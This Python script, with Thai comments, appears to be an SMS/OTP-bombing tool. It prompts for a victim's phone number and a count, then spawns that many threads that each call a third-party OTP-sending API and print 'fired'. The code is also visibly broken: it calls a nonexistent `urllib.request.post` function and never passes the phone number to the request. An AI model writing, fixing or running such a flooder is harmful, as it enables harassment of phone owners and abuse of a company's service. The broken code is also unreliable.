#โมดูล
import os
import time
import threading
from urllib import request
from requests import get
from re import search
from requests import Session
from threading import Thread
import colorama
os.system("clear")
print(" เครเด : ไม่เห็นค่า ไม่ว่ากัน ") 
phone = input("𝚙𝚑𝚘𝚗𝚎 : ") 
NUM = int(input("𝙽𝚞𝚖 : ")) 

def api1():
	request.post("https://api.scg-id.com/api/otp/send_otp")
	print("ยิงแล้ว")
	
for i in range(NUM):
	threading.Thread(target = api1).start()
	
